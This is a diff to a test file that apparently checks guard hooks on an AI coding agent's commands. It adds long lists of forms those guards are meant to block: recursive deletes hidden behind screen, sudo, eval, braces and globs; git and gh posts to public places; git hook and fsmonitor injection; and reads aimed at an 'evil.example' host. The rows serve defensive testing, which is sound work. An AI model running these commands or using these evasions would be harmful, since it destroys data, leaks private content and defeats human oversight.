@@ -16,6 +16,8 @@ export type Guard =
   | "no-kill-by-name"
   | "no-main-checkout"
   | "no-playground-leak"
+  | "no-public-leak"
+  | "no-raw-delete"
   | "no-raw-spawn"
   | "no-release-comment"
   | "no-stash"
@@ -65,6 +67,7 @@ export type Group = {
     | "#356"
     | "#402"
     | "#411"
+    | "#443"
     | "#446"
     | "#448"
     | "#452"
@@ -75,9 +78,14 @@ export type Group = {
     | "#486"
     | "#508"
     | "#509"
+    | "#533"
+    | "#536"
+    | "#555"
+    | "#579"
+    | "#614"
 }
 
-// The rows a guard-loosening PR lets run on purpose, each written as a row's "<source> <what>" for all its cases, or as one case's "<source> <what> | <guard> | <folder>"; canary lets none run.
+// The rows a guard-loosening PR lets run on purpose, and the rows that show the one form a guard lets run, each written as a row's "<source> <what>" for all its cases, or as one case's "<source> <what> | <guard> | <folder>".
 export const ALLOWED: string[] = [
   "#446 bun -e writing a JSON label whose prose names it",
   "#446 bun -e editing a JSON label whose prose names it, then a script",
@@ -88,6 +96,7 @@ export const ALLOWED: string[] = [
   "#466 git --attr-source with a subcommand for its value before a read in a repo with a heavy path staged",
   "#486 bun run ask with a prose arg that only names the tool",
   "#486 bun run thread with a prose arg that only names the tool",
+  "#536 a non-recursive rm of files inside the session's own worktree",
 ]
 
 // A harmless git alias nest of the given depth around an inner command line, each level double-quoted.
@@ -2087,6 +2096,67 @@ gh api graphql -f query="$QUERY"`,
     source: "#469",
   },
   {
+    folders: ["home", "data folder"],
+    guards: ["no-extensions-write"],
+    rows: ({ ROOT }) => [
+      ["awk piping its output into a shell", `awk '{ print | "sh" }'`],
+      ["awk piping a division's output into a shell", `awk '{ print $1/2 | "sh" }'`],
+      ["awk piping into a shell after a division", `awk '{ x = 3/4; print x | "sh" }'`],
+      ["awk reading a command through getline", `awk '{ "cmd" | getline x }'`],
+      [
+        "awk's system() in BEGIN",
+        `awk 'BEGIN { system("rm -rf ~/.playground/extensions/.no-such-folder") }'`,
+      ],
+      ["awk piping into a shell after a regex alternation", `awk '/a|b/ { print | "sh" }'`],
+      ["awk piping into a shell after a string alternation", `awk '$1 ~ "a|b" { print | "sh" }'`],
+      [
+        "awk piping into a shell after a comment holding a quote",
+        'awk \'# "\n{ print | "sh" }\' f',
+      ],
+      [
+        "awk piping into a shell after a block and a comment holding a quote",
+        'awk \'{ n++ } # "\n{ print | "sh" }\' f',
+      ],
+      [
+        "awk piping into a shell after a bracketed slash and a quote",
+        'awk \'/[/]"/ { print | "sh" }\' f',
+      ],
+      [
+        "awk piping into a shell beside a regex holding a quote after print",
+        'awk \'{ print /"/ | "sh"; print /"/ }\' f',
+      ],
+      [
+        "awk piping into a shell beside a regex holding a quote after printf",
+        'awk \'{ printf /"/ | "sh"; printf /"/ }\' f',
+      ],
+      [
+        "awk piping into a shell between regexes holding a quote after a plus",
+        'awk \'{ x = 1 + /"/; print | "sh"; y = 1 + /"/ }\' f',
+      ],
+      [
+        "awk piping into a shell between regexes holding a quote after a less-than",
+        'awk \'{ if (n < /"/) print | "sh"; m = n < /"/ }\' f',
+      ],
+      [
+        "awk piping into a shell between regexes holding a quote after return and a call",
+        'awk \'function f() { return /"/ } { print | "sh"; x = f() /"/ }\' f',
+      ],
+      [
+        "awk matching an alternation and printing into the root",
+        `awk '/a|b/ { print > "${ROOT}/x" }'`,
+      ],
+      [
+        "awk's heading alternation redirected into the root",
+        `awk '/^## .*6|7/{p=1} p' f > ${ROOT}/x`,
+      ],
+      [
+        "sed -i replacing text with a slash and parens in the root",
+        `sed -i '' 's/a / b (c)/new/' ${ROOT}/x`,
+      ],
+    ],
+    source: "#443",
+  },
+  {
     folders: ["data folder", "home"],
     guards: ["no-extensions-write"],
     rows: () => [
@@ -2302,6 +2372,421 @@ gh api graphql -f query="$QUERY"`,
     source: "#509",
   },
   {
+    folders: ["checkout", "home"],
+    guards: ["no-public-leak"],
+    rows: () => [
+      ["gh issue create", `gh issue create --repo quillco/playground -t x -b y`],
+      ["gh pr comment", `gh pr comment 1 --repo quillco/playground -b y`],
+      ["gh api POST", "gh api -X POST repos/quillco/playground/issues/1/comments -f body=y"],
+      ["gh api with a field and no method", "gh api repos/quillco/playground/issues -f title=y"],
+      ["git push to a URL", "git push https://github.com/quillco/playground.git main"],
+      ["git push to a remote it cannot place", "git push origin main"],
+      ["git push behind env", "env git push origin main"],
+      ["git push through bash -c", "bash -c 'git push origin main'"],
+      ["git push through eval", "eval 'git push origin main'"],
+      ["git push through a variable set in the call", "g=git; $g push origin main"],
+      ["git push through a function defined in the call", "f() { git push origin main; }; f"],
+      ["git push through an alias -c sets", "git -c alias.x=push x origin main"],
+      ["curl posting to Slack", "curl -X POST -d x https://slack.com/api/chat.postMessage"],
+      [
+        "the GitHub MCP's comment",
+        {
+          input: { body: "y", issue_number: 1, owner: "quillco", repo: "playground" },
+          tool: "mcp__github-shared__add_issue_comment",
+        },
+      ],
+      [
+        "a Slack MCP post",
+        {
+          input: { channel: "C0FAKE9999", text: "y" },
+          tool: "mcp__slack-shared__chat_post_message",
+        },
+      ],
+      [
+        "a Linear MCP comment",
+        { input: { body: "y", issueId: "X-1" }, tool: "mcp__linear-shared__save_comment" },
+      ],
+      ["gh repo delete", "gh repo delete quillco/acme-skills --yes"],
+      ["gh repo rename", "gh repo rename x -R quillco/acme-skills"],
+      ["gh repo edit", "gh repo edit quillco/acme-skills --description y"],
+      ["gh repo archive", "gh repo archive quillco/acme-skills --yes"],
+      ["gh repo create", "gh repo create quillco/acme-skills --private"],
+      ["gh repo sync", "gh repo sync quillco/acme-skills"],
+      ["gh release delete", "gh release delete v1 -R quillco/playground --yes"],
+      ["gh release upload", "gh release upload v1 f.txt -R quillco/playground"],
+      ["gh pr update-branch", "gh pr update-branch 1 -R quillco/playground"],
+      ["gh alias set", "gh alias set zz 'issue create'"],
+      ["gh secret set", "gh secret set X -R quillco/playground -b y"],
+      ["gh workflow run", "gh workflow run ci -R quillco/playground"],
+      ["gh label delete", "gh label delete bug -R quillco/playground --yes"],
+      ["gh issue delete", "gh issue delete 1 -R quillco/playground --yes"],
+      ["gh api DELETE of a repository", "gh api -X DELETE repos/quillco/playground"],
+      ["gh api DELETE of a branch", "gh api -X DELETE repos/quillco/playground/git/refs/heads/x"],
+      ["gh api DELETE of a comment", "gh api -X DELETE repos/quillco/playground/issues/comments/1"],
+      ["gh api with its method in a variable", "gh api -X $M repos/quillco/playground/issues"],
+      ["git send-pack", "git send-pack https://github.com/quillco/playground.git main"],
+      [
+        "git subtree push",
+        "git subtree push --prefix=a https://github.com/quillco/playground.git main",
+      ],
+      ["git commit outside a repository", "git commit -m x"],
+      [
+        "git fetch running an upload-pack program",
+        "git fetch --upload-pack='gh issue create' origin",
+      ],
+      ["git grep opening files in a pager program", "git grep -Ox foo"],
+      ["git log under a pager variable", "GIT_PAGER='gh issue create' git log"],
+      ["git log under a pager -c sets", "git -c core.pager='gh issue create' log"],
+      ["git with its subcommand in a variable", "git $SUB origin main"],
+      ["gh with its verb in a variable", "gh issue $VERB 1 -R quillco/playground"],
+      ["a gh read fed by xargs", "echo 1 | xargs gh issue view"],
+      ["gh issue create echoed into sh", "echo 'gh issue create -t a -b b' | sh"],
+      [
+        "gh issue create inside python's os.system",
+        "python3 -c \"import os; os.system('gh issue create -R quillco/playground -t a -b b')\"",
+      ],
+      ["gh pr comment under watch", 'watch -n 1 "gh pr comment 1 -R quillco/playground -b y"'],
+      ["a script named for Slack", "python3 post_to_slack.py"],
+      ["curl posting to another host", "curl -X POST -d x https://example.com/hook"],
+      ["curl uploading to another host", "curl -T f.txt https://example.com/up"],
+      [
+        "the GitHub MCP's repository create",
+        { input: { name: "acme-skills" }, tool: "mcp__github-shared__create_repository" },
+      ],
+      [
+        "a printf appending an fsmonitor program to .git/config",
+        "printf '[core]\\n\\tfsmonitor = gh issue create -R quillco/playground -t a -b b\\n' >> .git/config",
+      ],
+      [
+        "an echo writing a git hook",
+        "echo 'gh issue create -R quillco/playground -t a -b b' > .git/hooks/post-checkout",
+      ],
+      ["git log writing a script", "git log -1 --format='gh issue create -t a -b b' > run.sh"],
+      [
+        "git log writing past noclobber",
+        "git log -1 --format='gh issue create -t a -b b' >| run.sh",
+      ],
+      ["git log's stderr written to a file", "git log -1 2> run.sh"],
+      ["git log's both streams written to a file", "git log -1 &> run.sh"],
+      ["git fetch", "git fetch origin canary"],
+      [
+        "git fetch with an abbreviated upload-pack",
+        "git fetch --upload-pa='gh issue create -t a -b b; git-upload-pack' .",
+      ],
+      [
+        "git ls-remote's exec alias",
+        "git ls-remote --exec='gh issue create -t a -b b; git-upload-pack' .",
+      ],
+      [
+        "git ls-remote with an abbreviated upload-pack",
+        "git ls-remote --upload-p='gh issue create -t a -b b; git-upload-pack' .",
+      ],
+      [
+        "git grep with an abbreviated pager option",
+        "git grep --open='gh issue create -t a -b b' foo",
+      ],
+      ["git grep with its pager in a cluster", "git grep -nOsh foo"],
+      [
+        "git log writing .git/config through --output",
+        "git log -1 --format='[core]%n%x09fsmonitor = gh issue create -t a -b b' --output=.git/config",
+      ],
+      [
+        "git diff writing a hook through --output",
+        "git diff --output=.git/hooks/pre-commit HEAD~1",
+      ],
+      [
+        "sort with an abbreviated compress program",
+        "sort -S 1k --compress-prog=./x.sh .git/config",
+      ],
+      ["sort writing a file through -o", "sort -o out .git/config"],
+      ["uniq writing its second operand", "uniq .git/config out"],
+      [
+        "gh api with DELETE in a cluster",
+        "gh api -iXDELETE repos/quillco/playground/git/refs/heads/x",
+      ],
+      ["gh api with a field in a cluster", "gh api -iftitle=y repos/quillco/playground/issues"],
+      [
+        "gh issue create behind a value flag of list",
+        "gh issue --title list create -R quillco/playground -b y",
+      ],
+      [
+        "gh pr comment behind a value flag of list",
+        "gh pr --body list comment 1 -R quillco/playground",
+      ],
+      [
+        "gh issue create behind a root value flag of search",
+        "gh --title search issue create -R quillco/playground -b y",
+      ],
+      ["gh api to another host", "gh api --hostname example.com 'x?q=data'"],
+      ["git remote add behind -v", "git remote -v add x https://github.com/quillco/playground.git"],
+      [
+        "git remote set-url behind -v",
+        "git remote -v set-url origin https://github.com/quillco/other.git",
+      ],
+      ["git log under a less preprocessor", "LESSOPEN='|gh issue create -t a -b b %s' git log"],
+      ["a program named cat by a path under .git", ".git/hooks/cat x"],
+      ["a program named git by a path", "./tools/git log"],
+      [
+        "git log whose bare --pretty lets --output write .git/config",
+        "git log -1 --pretty --output=.git/config --format='[core]%n%x09fsmonitor = gh issue create -t a -b b'",
+      ],
+      [
+        "git show whose bare --pretty lets --output write a hook",
+        "git show --pretty --output=.git/hooks/pre-commit HEAD",
+      ],
+      [
+        "git log whose bare --format lets --output truncate .git/config",
+        "git log --format --output=.git/config",
+      ],
+      [
+        "git log behind -C whose bare --pretty lets --output write",
+        "git -C . log --pretty --output=.git/config",
+      ],
+      ["git diff with an unquoted glob", "git diff *"],
+      ["gh issue list on another host", "gh issue list -R evil.example/o/r --search private-text"],
+      ["gh issue view of another host's URL", "gh issue view https://evil.example/o/r/issues/1"],
+      [
+        "gh pr view of another host's URL",
+        "gh pr view https://evil.example/o/r/pull/1 -R quillco/playground",
+      ],
+      ["gh pr diff of another host's URL", "gh pr diff https://evil.example/o/r/pull/1"],
+      [
+        "git log with a brace after a quoted part",
+        `git log -1 --format="[core]%n%x09fsmonitor = gh issue create -t a -b b" ""{--output=.git/config,HEAD}`,
+      ],
+      [
+        "git diff with a brace after a quoted part",
+        `git diff ""{--output=.git/hooks/pre-commit,HEAD}`,
+      ],
+      ["git diff with a glob after a double-quoted part", `git diff ""*`],
+      ["git diff with a glob after a single-quoted part", "git diff ''*"],
+      [
+        "cat of a zsh =() process substitution",
+        "cat =(gh issue create -R quillco/playground -t a -b b)",
+      ],
+      ["cat with a zsh glob qualifier", `cat .git/HEAD(e:"gh issue create -t a -b b":)`],
+      ["git diff with a zsh glob qualifier", `git diff HEAD(e:"gh issue create -t a -b b":)`],
+      [
+        "git log with a zsh word-split parameter",
+        "cd 'x --output=h' && git log -1 --format=%H $=PWD",
+      ],
+      ["git log behind -C with a zsh word-split parameter", "git -C .. log -1 $=PWD"],
+      ["git log with a zsh glob parameter", "git log $~HOME"],
+      ["git log with a zsh brace parameter", "git log $^HOME"],
+    ],
+    source: "#555",
+  },
+  {
+    folders: ["checkout"],
+    guards: ["no-raw-delete"],
+    rows: () => [
+      [
+        "the incident's form, a recursive delete in sh -c behind screen -dm",
+        `screen -dm sh -c 'rm -rf ${NEVER_MADE}'`,
+      ],
+      [
+        "a recursive delete behind screen -dmS and a session name",
+        `screen -dmS job rm -rf ${NEVER_MADE}`,
+      ],
+      [
+        "a recursive delete in bash -c behind screen's flags apart",
+        `screen -d -m bash -c "rm -rf ${NEVER_MADE}"`,
+      ],
+      ["a recursive delete behind tmux new -d as one string", `tmux new -d 'rm -rf ${NEVER_MADE}'`],
+      [
+        "a recursive delete behind tmux new-session -d -s as words",
+        `tmux new-session -d -s job rm -rf ${NEVER_MADE}`,
+      ],
+      [
+        "a recursive delete of a variable in tmux's double-quoted string",
+        `tmux new -d "rm -rf $D"`,
+      ],
+      ["a recursive delete behind nohup", `nohup rm -rf ${NEVER_MADE} &`],
+      [
+        "a recursive delete in sh -c behind nohup",
+        `nohup sh -c 'rm -rf ${NEVER_MADE}' >/dev/null 2>&1 &`,
+      ],
+      ["a recursive delete fed to at by a here-string", `at now <<< 'rm -rf ${NEVER_MADE}'`],
+      ["a recursive delete echoed into at", `echo 'rm -rf ${NEVER_MADE}' | at now`],
+      ["a recursive delete as watch's command line", `watch -n 60 'rm -rf ${NEVER_MADE}'`],
+      ["rm -r", `rm -r ${NEVER_MADE}`],
+      ["rm -R", `rm -R ${NEVER_MADE}`],
+      ["rm --recursive", `rm --recursive ${NEVER_MADE}`],
+      ["rm --recursive abbreviated", `rm --rec ${NEVER_MADE}`],
+      ["rm -fr", `rm -fr ${NEVER_MADE}`],
+      ["rm with -r after its target", `rm ${NEVER_MADE} -r`],
+      ["a recursive rm of a glob", "rm -rf ~/.playground/ext*/.no-such-folder"],
+      ["a recursive rm of a variable", `rm -rf "$DIR"`],
+      ["an rm whose options sit in a variable", `rm $OPTS ${NEVER_MADE}`],
+      ["a recursive rm by its absolute path", `/bin/rm -rf ${NEVER_MADE}`],
+      ["a recursive rm behind sudo", `sudo rm -rf ${NEVER_MADE}`],
+      ["a recursive rm behind sudo -su", `sudo -su root rm -rf ${NEVER_MADE}`],
+      ["a recursive rm behind sudo -u and --", `sudo -u root -- rm -rf ${NEVER_MADE}`],
+      ["a recursive rm behind command", `command rm -rf ${NEVER_MADE}`],
+      ["a recursive rm with its name quoted apart", `r''m -rf ${NEVER_MADE}`],
+      ["a recursive rm with its name escaped", `\\rm -rf ${NEVER_MADE}`],
+      ["a recursive rm in a command substitution", `echo $(rm -rf ${NEVER_MADE})`],
+      ["a recursive rm in eval", `eval 'rm -rf ${NEVER_MADE}'`],
+      ["a recursive rm run by a program in a variable", `$RM -rf ${NEVER_MADE}`],
+      [
+        "a recursive rm inside the session's own worktree",
+        "rm -rf node_modules",
+        "process worktree",
+      ],
+      ["a non-recursive rm outside the session's own worktree and scratchpad", `rm ${NEVER_MADE}`],
+      ["find -delete", `find ${NEVER_MADE} -delete`],
+      ["find -exec rm with +", `find ${NEVER_MADE} -exec rm {} +`],
+      ["find -exec rm -rf", `find ${NEVER_MADE} -exec rm -rf {} \\;`],
+      ["find -execdir rm", `find ${NEVER_MADE} -execdir rm {} \\;`],
+      [
+        "find -exec of a shell that deletes recursively",
+        `find ${NEVER_MADE} -exec sh -c 'rm -rf "$1"' _ {} \\;`,
+      ],
+      ["xargs rm", `echo ${NEVER_MADE} | xargs rm`],
+      ["xargs rm -rf", `echo ${NEVER_MADE} | xargs rm -rf`],
+      ["xargs -I rm", `printf '%s\\0' ${NEVER_MADE} | xargs -0 -I{} rm {}`],
+      ["git clean -fd", "git clean -fd"],
+      ["git clean -fdx", "git clean -fdx"],
+      ["git clean -f -x", "git clean -f -x"],
+      ["git clean --force -d", "git clean --force -d"],
+      ["git clean -xf behind git -C", `git -C ${NEVER_MADE} clean -xf`],
+      ["git worktree remove --force", `git worktree remove --force ${NEVER_MADE}`],
+      ["git worktree remove -f", `git worktree remove -f ${NEVER_MADE}`],
+      ["a recursive delete in a git alias", `git -c alias.x='!rm -rf ${NEVER_MADE}' x`],
+      ["chmod -a", `chmod -a 'everyone deny delete' ${NEVER_MADE}`],
+      ["chmod -N", `chmod -N ${NEVER_MADE}`],
+      ["chmod -R -a#", `chmod -R -a# 0 ${NEVER_MADE}`],
+      ["chflags", `chflags nouchg ${NEVER_MADE}`],
+      ["chflags -R", `chflags -R noschg ${NEVER_MADE}`],
+      [
+        "a non-recursive rm of files inside the session's own worktree",
+        "rm -f notes.txt build.log",
+        "process worktree",
+      ],
+      [
+        "a recursive rm behind run-slot",
+        `~/.playground/ops/run-slot.sh me -- rm -rf ${NEVER_MADE}`,
+      ],
+      [
+        "a recursive rm behind run-slot run as bash's script",
+        `bash ~/.playground/ops/run-slot.sh me -- rm -rf ${NEVER_MADE}`,
+      ],
+      ["GNU rm by its Homebrew name", `grm -rf ${NEVER_MADE}`],
+      ["GNU rm by its Homebrew path", `/opt/homebrew/bin/grm -rf ${NEVER_MADE}`],
+      ["a recursive rm behind arch", `arch -arm64 rm -rf ${NEVER_MADE}`],
+      ["a recursive rm behind script", `script -q /dev/null rm -rf ${NEVER_MADE}`],
+      ["a recursive rm behind xcrun", `xcrun rm -rf ${NEVER_MADE}`],
+      ["a recursive rm behind launchctl submit", `launchctl submit -l x -- rm -rf ${NEVER_MADE}`],
+      ["a recursive rm behind watch as words", `watch -n1 rm -rf ${NEVER_MADE}`],
+      ["a recursive rm behind parallel", `parallel rm -rf ::: ${NEVER_MADE}`],
+      ["a plain rm behind parallel", `parallel rm ::: ${NEVER_MADE}`],
+      ["fd -X rm", `fd . ${NEVER_MADE} -X rm -rf`],
+      ["fd --exec rm", `fd . ${NEVER_MADE} --exec rm -rf`],
+      ["fd -x plain rm", `fd . ${NEVER_MADE} -x rm`],
+      ["a recursive rm behind busybox", `busybox rm -rf ${NEVER_MADE}`],
+      ["a recursive delete fed to batch by a here-string", `batch <<< 'rm -rf ${NEVER_MADE}'`],
+      ["a recursive delete echoed into batch", `echo 'rm -rf ${NEVER_MADE}' | batch`],
+      ["a recursive rm behind setsid", `setsid rm -rf ${NEVER_MADE}`],
+      ["a recursive rm behind flock", `flock /tmp/l rm -rf ${NEVER_MADE}`],
+      ["a recursive rm behind lockf", `lockf /tmp/l rm -rf ${NEVER_MADE}`],
+      ["a recursive rm behind gtimeout", `gtimeout 5 rm -rf ${NEVER_MADE}`],
+      ["a recursive rm behind gxargs", "gxargs rm -rf < /dev/null"],
+      ["a plain rm behind gxargs", "gxargs rm < /dev/null"],
+      ["a brace that spells -r in a worktree", "rm -{r,f} sub", "process worktree"],
+      ["a brace that spells -r", `rm -{r,f} ${NEVER_MADE}`],
+      ["a brace that spells --recursive", `rm --recurs{ive,} ${NEVER_MADE}`],
+      ["a brace that spells the whole command", `{rm,-rf,${NEVER_MADE}}`],
+      ["braces that spell rm and -r", `{r,}m -{r,}f ${NEVER_MADE}`],
+      ["a glob that spells rm", `/bin/r? -rf ${NEVER_MADE}`],
+      ["a bracket glob that spells rm", `/bin/r[m] -rf ${NEVER_MADE}`],
+      ["a program and options in variables", `$RM $FLAGS ${NEVER_MADE}`],
+      ["find -exec rm behind env", "find . -exec env rm {} +", "process worktree"],
+      ["find -exec rm behind nohup", `find ${NEVER_MADE} -exec nohup rm {} +`],
+      ["git clean -fX, ignored files alone", "git clean -fX"],
+      ["a guarded rm of variable parts", 'rm "${S:?}/${m:?}"'],
+      ["git clean -d with a prefix of --force", "git clean --forc -d"],
+      ["git clean -dx with a prefix of --force", "git clean --forc -dx"],
+      ["git clean -d with requireForce off", "git -c clean.requireForce=false clean -d"],
+      ["git clean -dx with requireForce off", "git -c clean.requireForce=false clean -dx"],
+      ["rimraf through npx", `npx rimraf ${NEVER_MADE}`],
+      ["rimraf through bunx", `bunx rimraf ${NEVER_MADE}`],
+      ["rimraf through bun x", `bun x rimraf ${NEVER_MADE}`],
+      ["rsync --delete from an empty folder", `rsync -a --delete /var/empty/ ${NEVER_MADE}/`],
+      ["rsync's --del alias from an empty folder", `rsync -a --del /var/empty/ ${NEVER_MADE}/`],
+      ["a program in a variable given -r behind arch", `arch -arm64 $R -rf ${NEVER_MADE}`],
+      ["a glob program given -r behind arch", `arch -arm64 /bin/r? -rf ${NEVER_MADE}`],
+      ["a substituted program given -r behind arch", `arch -arm64 "$(echo rm)" -rf ${NEVER_MADE}`],
+      [
+        "a program in a variable given -r behind script",
+        `script -q /dev/null $RM -rf ${NEVER_MADE}`,
+      ],
+      ["a variable set to rm given -r behind arch", `R=/bin/rm; arch -arm64 $R -rf ${NEVER_MADE}`],
+      ["rimraf with a version through npx", `npx -y rimraf@latest ${NEVER_MADE}`],
+      ["rimraf with a version through bunx", `bunx rimraf@5 ${NEVER_MADE}`],
+      ["fd --exec=rm", `fd . ${NEVER_MADE} --exec=rm`],
+      ["fd -x=rm", `fd . ${NEVER_MADE} -x=rm`],
+      ["fd -xrm", `fd . ${NEVER_MADE} -xrm`],
+      ["a half-quoted glob that spells rm", `'/bin/r'? -rf ${NEVER_MADE}`],
+      ["a glob that spells rm with its name quoted", `/bin/'r'? -rf ${NEVER_MADE}`],
+      ["a half-quoted glob program behind arch", `arch -arm64 '/bin/r'? -rf ${NEVER_MADE}`],
+    ],
+    source: "#536",
+  },
+  {
+    folders: ["checkout"],
+    guards: ["no-raw-delete"],
+    rows: () => [
+      ["del-cli through npx", `npx del-cli ${NEVER_MADE}`],
+      ["del-cli with a version through npx", `npx -y del-cli@5 ${NEVER_MADE}`],
+      ["del-cli through bunx", `bunx del-cli ${NEVER_MADE}`],
+      ["del-cli through pnpm dlx", `pnpm dlx del-cli ${NEVER_MADE}`],
+      ["del-cli through pnpx", `pnpx del-cli ${NEVER_MADE}`],
+      ["del-cli's del bin through npx", `npx del ${NEVER_MADE}`],
+      ["del-cli run by its own name", `del-cli ${NEVER_MADE}`],
+      ["del-cli's del bin run by its path", `./node_modules/.bin/del ${NEVER_MADE}`],
+      [
+        "rsync's source-removal option",
+        `rsync -a --remove-source-files ${NEVER_MADE}/ /var/empty/x/`,
+      ],
+      [
+        "rsync's old source-removal alias",
+        `rsync -a --remove-sent-files ${NEVER_MADE}/ /var/empty/x/`,
+      ],
+      ["fd's -X behind another short flag, then rm", `fd . ${NEVER_MADE} -HX rm`],
+      ["fd's -x behind another short flag, then rm", `fd . ${NEVER_MADE} -Hx rm`],
+      ["fd's clustered -x with rm attached", `fd . ${NEVER_MADE} -HIxrm`],
+      ["fd's clustered -x with =rm attached", `fd . ${NEVER_MADE} -Hx=rm`],
+      ["at fed a job from a variable's file", `at now < "$F"`],
+      ["at fed a job from an unquoted variable's file", `at now < $F`],
+      ["at given -f a variable's file", `at -f "$F" now`],
+      ["at fed a variable's file inside bash -c's double quotes", `bash -c "at now < $F"`],
+      ["at fed a program's output, which the hook cannot read", "ls | at now"],
+      ["a variable holding a recursive delete, run unquoted", `c="rm -rf ${NEVER_MADE}"; $c`],
+      [
+        "an exported variable holding a recursive delete, run unquoted",
+        `export c="rm -rf ${NEVER_MADE}"; $c`,
+      ],
+      ["a variable holding a recursive delete, run as ${c}", `c="rm -rf ${NEVER_MADE}"; \${c}`],
+      [
+        "a variable holding a recursive delete, run unquoted under bash",
+        `bash -c 'c="rm -rf ${NEVER_MADE}"; $c'`,
+      ],
+      ["shred -u", `shred -u ${NEVER_MADE}/x`],
+      ["shred -u in a cluster", `shred -zu ${NEVER_MADE}/x`],
+      ["shred --remove", `shred --remove ${NEVER_MADE}/x`],
+      ["shred --remove with a value", `shred --remove=wipe ${NEVER_MADE}/x`],
+      ["shred by a prefix of --remove", `shred --rem ${NEVER_MADE}/x`],
+      ["GNU shred's Homebrew name with -u", `gshred -u ${NEVER_MADE}/x`],
+      ["tar --remove-files", `tar -cf /var/empty/a.tar --remove-files ${NEVER_MADE}`],
+      ["tar by a prefix of --remove-files", `tar --remove-f -cf /var/empty/a.tar ${NEVER_MADE}`],
+      [
+        "GNU tar's Homebrew name with --remove-files",
+        `gtar -cf /var/empty/a.tar --remove-files ${NEVER_MADE}`,
+      ],
+    ],
+    source: "#579",
+  },
+  {
     folders: ["process home"],
     guards: ["no-extensions-write"],
     rows: () => [
@@ -2346,5 +2831,138 @@ gh api graphql -f query="$QUERY"`,
       ["a quiet message on a git outside the system folders", `/tmp/x/git commit -m "fix(x): y"`],
     ],
     source: "#452",
+  },
+  {
+    folders: ["process home", "process data folder", "process worktree"],
+    guards: ["no-extensions-write"],
+    rows: () => [
+      [
+        "a removal echoed to sudo's shell, its user option after it in a cluster",
+        "echo 'rm -rf ~/.playground/extensions/.no-such-folder' | sudo -su root",
+      ],
+      [
+        "a removal echoed to sudo's login shell, its user option after it in a cluster",
+        "echo 'rm -rf ~/.playground/extensions/.no-such-folder' | sudo -iu root",
+      ],
+      [
+        "a removal echoed to sudo's shell inside a longer cluster before its user option",
+        "echo 'rm -rf ~/.playground/extensions/.no-such-folder' | sudo -Esu root",
+      ],
+      [
+        "a removal echoed to sudo's shell, its user value attached in the cluster",
+        "echo 'rm -rf ~/.playground/extensions/.no-such-folder' | sudo -suroot",
+      ],
+      [
+        "a removal echoed to doas's shell, its user option after it in a cluster",
+        "echo 'rm -rf ~/.playground/extensions/.no-such-folder' | doas -su root",
+      ],
+      [
+        "a removal in a here-string to sudo's shell, its user option after it in a cluster",
+        "sudo -su root <<< 'rm -rf ~/.playground/extensions/.no-such-folder'",
+      ],
+      [
+        "a removal echoed to sudo's shell, its user value a uid attached in the cluster",
+        "echo 'rm -rf ~/.playground/extensions/.no-such-folder' | sudo -su#0",
+      ],
+      [
+        "a removal echoed to sudo's shell, its user value a digit attached in the cluster",
+        "echo 'rm -rf ~/.playground/extensions/.no-such-folder' | sudo -su0",
+      ],
+      [
+        "a removal echoed to sudo's shell, its user value holding an underscore",
+        "echo 'rm -rf ~/.playground/extensions/.no-such-folder' | sudo -su_www",
+      ],
+      [
+        "a removal echoed to sudo's shell, its user value holding a dot",
+        "echo 'rm -rf ~/.playground/extensions/.no-such-folder' | sudo -suroot.x",
+      ],
+      [
+        "a removal echoed to sudo's shell, its close-from value attached in the cluster",
+        "echo 'rm -rf ~/.playground/extensions/.no-such-folder' | sudo -sC3",
+      ],
+      [
+        "a removal echoed to sudo's shell, its chdir value a path attached in the cluster",
+        "echo 'rm -rf ~/.playground/extensions/.no-such-folder' | sudo -sD/tmp",
+      ],
+      [
+        "a removal echoed to sudo's login shell, its user value a uid attached in the cluster",
+        "echo 'rm -rf ~/.playground/extensions/.no-such-folder' | sudo -iu#0",
+      ],
+      [
+        "a removal echoed to doas's shell, its user value a uid attached in the cluster",
+        "echo 'rm -rf ~/.playground/extensions/.no-such-folder' | doas -su#0",
+      ],
+      [
+        "a removal in a here-string to sudo's shell, its user value a uid attached in the cluster",
+        "sudo -su#0 <<< 'rm -rf ~/.playground/extensions/.no-such-folder'",
+      ],
+      [
+        "a removal echoed to sudo's shell behind nice, its user option after it in a cluster",
+        "echo 'rm -rf ~/.playground/extensions/.no-such-folder' | nice sudo -su root",
+      ],
+      [
+        "a removal echoed to sudo's shell behind env, its user value a uid attached",
+        "echo 'rm -rf ~/.playground/extensions/.no-such-folder' | env sudo -su#0",
+      ],
+    ],
+    source: "#533",
+  },
+  {
+    folders: ["home"],
+    guards: ["no-extensions-write"],
+    rows: ({ ROOT }) => {
+      const from: [Folder, string, string[]][] = [
+        [
+          "extensions root",
+          "",
+          ["acme", "extensions/acme", ".playground/extensions/acme", "../extensions/acme"],
+        ],
+        [
+          "data folder",
+          "",
+          ["extensions/acme", ".playground/extensions/acme", "../extensions/acme"],
+        ],
+        ["home", "", [".playground/extensions/acme"]],
+        [
+          "home",
+          "/.playground",
+          ["extensions/acme", ".playground/extensions/acme", "../extensions/acme"],
+        ],
+      ]
+      return [
+        ...["~-", "~+"].flatMap((tilde) =>
+          from.flatMap(([folder, tail, paths]) =>
+            paths.map(
+              (path) =>
+                [
+                  `pushd ${tilde}${tail} from the ${folder} before rm of ${path}`,
+                  `pushd ${tilde}${tail}; rm -rf ${path}`,
+                  folder,
+                ] as const,
+            ),
+          ),
+        ),
+        [
+          "pushd ~- beside a folder named ~-, read as typed",
+          `cd /tmp; cd ${ROOT}/hooks; pushd ~-; rm -rf acme`,
+        ],
+        [
+          "pushd ~+ beside a folder named ~+, read as typed",
+          `cd ${ROOT}/hooks; pushd ~+/../..; rm -rf acme`,
+        ],
+        ["a glob in cd's folder", "cd .playground/e*; rm -rf login"],
+        ["a glob in pushd's folder", "pushd .playground/ext?nsions; rm -rf login"],
+      ]
+    },
+    source: "#614",
+  },
+  {
+    folders: ["main checkout"],
+    guards: ["no-main-checkout"],
+    rows: () => [
+      ["pushd ~+ before a build", "pushd ~+; bun run build"],
+      ["pushd ~+ before a commit", "pushd ~+; git commit -m x"],
+    ],
+    source: "#614",
   },
 ]
